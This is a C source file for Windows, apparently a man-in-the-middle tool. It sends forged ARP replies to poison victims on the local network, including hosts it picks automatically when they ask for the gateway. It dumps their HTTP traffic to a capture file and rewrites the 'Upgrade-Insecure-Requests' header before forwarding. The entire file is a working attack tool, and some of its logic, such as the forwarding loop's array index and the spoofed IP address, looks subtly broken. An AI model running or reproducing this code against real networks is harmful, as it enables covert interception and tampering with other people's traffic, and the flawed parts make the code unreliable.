#include "pcap.h"
#include "ntddndis.h"
#include "iphlpapi.h"
#include "tchar.h"
#include "packet.h"

#ifdef _DEBUG
#define LOG(args...) \
    printf(args);    \
    printf("\n");
#else
#define LOG(args...)
#endif

// System Specific
BOOL LoadNpcapDlls()
{
    _TCHAR npcap_dir[512];
    UINT len;
    len = GetSystemDirectory(npcap_dir, 480);
    if (!len)
    {
        fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
        return FALSE;
    }
    _tcscat_s(npcap_dir, 512, _T("\\Npcap"));
    if (SetDllDirectory(npcap_dir) == 0)
    {
        fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
        return FALSE;
    }
    return TRUE;
}
#define MAX_MACHINES 2
#define MAX_THREADS MAX_MACHINES * 2
unsigned int threadsTop = 0;
HANDLE hThreads[MAX_THREADS];

// Statics

BOOL exitFlag = FALSE;
BOOL enableAutoSpoof = FALSE;

// Logics

typedef struct
{
    uint8_t MacAddress[6];
    uint32_t IpAddress;
} MachineInfo;

unsigned int spoofedTop = 0;
MachineInfo spoofedMachines[MAX_MACHINES];

const char *DEVICE_NAME = "\\Device\\NPF_{29F6B571-59B8-4673-944F-F80EA9E5770C}";
unsigned long ipAddr, gateAddr;
unsigned char localMacAddr[6], gateMacAddr[6];

void init_addrs();
void manual_setup_spoof(uint32_t targetIp);
void enable_auto_spoof(BOOL value) { enableAutoSpoof = value; }
void ethernet_protocol_callback(unsigned char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);

pcap_t *mainDevice;
int main(int argc, char **argv)
{
    char errbuf[PCAP_BUF_SIZE];

    if (!LoadNpcapDlls())
    {
        printf("Failed to load Npcap!");
        exit(1);
    }

    init_addrs();

    mainDevice = pcap_open(DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (mainDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }
    pcap_dumper_t *dumpDevice = pcap_dump_open(mainDevice, "dump.pcap");

    LOG("Capture started");
    if (pcap_loop(mainDevice, -1, ethernet_protocol_callback, (u_char *)dumpDevice))
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }

    pcap_close(mainDevice);
}

void init_addrs()
{
    PIP_ADAPTER_INFO pAdapterInfo;

    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL)
    {
        LOG("Error allocating memory needed to call GetAdaptersinfo\n");
        exit(1);
    }
    // Make an initial call to GetAdaptersInfo to get
    // the necessary size into the ulOutBufLen variable
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            LOG("Error allocating memory needed to call GetAdaptersinfo\n");
            exit(1);
        }
    }

    DWORD dwRetVal;
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
    {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter)
        {
            if (strstr(DEVICE_NAME, pAdapter->AdapterName) != NULL)
            {
                ipAddr = inet_addr(pAdapter->IpAddressList.IpAddress.String);
                gateAddr = inet_addr(pAdapter->GatewayList.IpAddress.String);
                for (int i = 0; i < pAdapter->AddressLength; i++)
                {
                    localMacAddr[i] = pAdapter->Address[i];
                }
                ULONG size = 6;
                SendARP(gateAddr, ipAddr, gateMacAddr, &size);

                if (size != 6)
                {
                    LOG("Failed to obtain Mac Addresses!")
                    exit(1);
                }
                LOG("Mac Addresses:\nLocal:%.2x%.2x%.2x%.2x%.2x%.2x\nGate:%.2x%.2x%.2x%.2x%.2x%.2x",
                    localMacAddr[0], localMacAddr[1], localMacAddr[2], localMacAddr[3], localMacAddr[4], localMacAddr[5],
                    gateMacAddr[0], gateMacAddr[1], gateMacAddr[2], gateMacAddr[3], gateMacAddr[4], gateMacAddr[5])
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    else
    {
        LOG("GetAdaptersInfo failed with error: %d\n", dwRetVal);
        exit(1);
    }

    if (pAdapterInfo)
        free(pAdapterInfo);
}

// Packet Utilities
uint16_t Checksum(uint16_t *packet, int packlen)
{
    register unsigned long sum = 0;

    while (packlen > 1)
    {
        sum += *(packet++);
        packlen -= 2;
    }

    if (packlen > 0)
        sum += *(unsigned char *)packet;

    /* TODO: this depends on byte order */

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (uint16_t)~sum;
}
uint16_t TcpPacketLen(TcpPacket *tcpPacket)
{
    return ntohs(tcpPacket->ipv4.len) - sizeof(tcpPacket->ipv4);
}
uint16_t TcpChecksum(TcpPacket *tcpPacket)
{
    uint16_t len = TcpPacketLen(tcpPacket);
    uint8_t *buf = malloc(12 + len);
    // setup pseudo header
    memcpy(buf, &tcpPacket->ipv4.src, sizeof(uint32_t));
    memcpy(buf + 4, &tcpPacket->ipv4.dst, sizeof(uint32_t));
    buf[8] = 0;
    buf[9] = (tcpPacket->ipv4.proto);
    memcpy(buf + 10, &len, sizeof(uint16_t));
    buf[10] = (uint16_t)(len & 0xFF00) >> 8;
    buf[11] = (uint16_t)(len & 0x00FF);
    memcpy(buf + 12, &tcpPacket->tcp, len);
    ((tcp_header *)(buf + 12))->checksum = 0;
    uint16_t checksum = Checksum((uint16_t *)buf, 12 + len);
    free(buf);
    return checksum;
}

void SetupArpPacket(ArpPacket *packet, uint8_t *sourceMac, uint8_t *destMac,
                    uint32_t sourceIp, uint32_t destIp, uint16_t opcode)
{
    memcpy(packet->ether.ether_shost, sourceMac, 6);
    memcpy(packet->ether.ether_dhost, destMac, 6);
    packet->ether.ether_type = ntohs(0x0806); // ARP
    packet->arp.ar_hrd = ntohs(1);
    packet->arp.ar_pro = ntohs(0x0800); // IPV4
    packet->arp.ar_hln = 6;
    packet->arp.ar_pln = 4;
    packet->arp.ar_op = ntohs(opcode); // 1 for request,2 for reply
    memcpy(packet->arp.ar_sha, sourceMac, 6);
    packet->arp.ar_sip = sourceIp;
    memcpy(packet->arp.ar_tha, destMac, 6);
    packet->arp.ar_tip = destIp;
}

ULONG SpoofThreadProc(LPVOID lpParams)
{
    MachineInfo *params = lpParams;
    char errbuf[PCAP_BUF_SIZE];
    pcap_t *subDevice = pcap_open(DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    ArpPacket *arpPacket = malloc(sizeof(ArpPacket));
    while (!exitFlag)
    {
        SetupArpPacket(arpPacket, localMacAddr, params->MacAddress, ipAddr, params->IpAddress, 2);
        pcap_sendpacket(subDevice, (const uint8_t *)arpPacket, sizeof(ArpPacket));
    }
    free(arpPacket);
    pcap_close(subDevice);
    free(params);
}

void createSpoofThread(uint8_t *targetMac, uint32_t targetIp)
{
    if (spoofedTop >= MAX_MACHINES)
    {
        return;
    }

    DWORD threadId;
    HANDLE handle;
    MachineInfo *pParams = malloc(sizeof(MachineInfo));
    memcpy(pParams->MacAddress, targetMac, 6);
    pParams->IpAddress = targetIp;
    if (handle = CreateThread(NULL, 0, SpoofThreadProc, pParams, 0, &threadId))
    {
        LOG("Spoof thread on MAC %.2x%.2x%.2x%.2x%.2x%.2x started",
            targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5]);
        hThreads[threadsTop++] = handle;
        memcpy(&spoofedMachines[spoofedTop], pParams, sizeof(MachineInfo));
        spoofedTop++;
    }
}

void handleHttp(TcpPacket *tcpPacket, uint16_t len)
{
    if (!len)
        return;
    uint8_t *payload = tcpPacket->payload;
    char *pos = NULL;
    if (pos = strstr(payload, "Upgrade-Insecure-Requests"))
    {
        uint8_t *lineEnd = (uint8_t *)strstr(pos, "\r\n"); // It should always be
        if (*(lineEnd - 1) == '1')           // found
        {
            TcpPacket *newPacket = malloc(sizeof(TcpPacket) + len);
            memcpy(newPacket, tcpPacket, sizeof(TcpPacket));
            memcpy(newPacket->payload, payload, len);
            memcpy(newPacket->ether.ether_dhost, gateMacAddr, 6);
            *(newPacket->payload + (lineEnd - payload) - 1) = '0';
            newPacket->tcp.checksum = TcpChecksum(newPacket);
            pcap_sendpacket(mainDevice, (const uint8_t *)newPacket, sizeof(TcpPacket) + len);
            free(newPacket);
        }
    }
    return;
}

void ethernet_protocol_callback(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
{
    u_char *dumpDevice = argument;
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;
    uint32_t arp = ntohs(0x0806);
    uint32_t ipv4 = ntohs(0x0800);
    if (ethPacket->header.ether_type == arp && enableAutoSpoof) // arp
    {
        ArpPacket *arpPacket = (ArpPacket *)ethPacket;
        if (arpPacket->arp.ar_op == 1 && memcmp(&arpPacket->arp.ar_sha, localMacAddr, 6)) // request
        {
            if (arpPacket->arp.ar_tip == gateAddr)
            // We got an newbie, spoof it
            {
                createSpoofThread(arpPacket->arp.ar_sha, arpPacket->arp.ar_sip);
                return;
            }
        }
    }
    else if (ethPacket->header.ether_type == ipv4) // IPv4
    {
        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
        if (ipv4Packet->ipv4.proto == 6) // TCP
        {
            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
            if (sourcePort == 80 || destPort == 80) // HTTP
            {
                pcap_dump(dumpDevice, packet_header, packet_content);
                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
                uint16_t checksum = TcpChecksum(tcpPacket);
                handleHttp(tcpPacket, len);
                return;
            }
        }
    }
    for (int i = 0; i < spoofedTop; i++)
    {
        if (memcmp(ethPacket->header.ether_shost, spoofedMachines[spoofedTop].MacAddress, 6) == 0)
        {
            uint8_t *pkt = malloc(packet_header->len);
            memcpy(pkt, packet_content, packet_header->len);
            pcap_sendpacket(mainDevice, pkt, packet_header->len);
            break;
        }
    }
}

void manual_setup_spoof(uint32_t targetIp)
{
    ULONG size = 6;
    char targetMac[6];
    SendARP(targetIp, ipAddr, targetMac, &size);

    if (size != 6)
    {
        struct in_addr addr;
        addr.s_addr = targetIp;
        LOG("Failed to obtain Mac Addresses for target ip %s", inet_ntoa(addr))
        return;
    }

    createSpoofThread(targetMac, targetIp);
}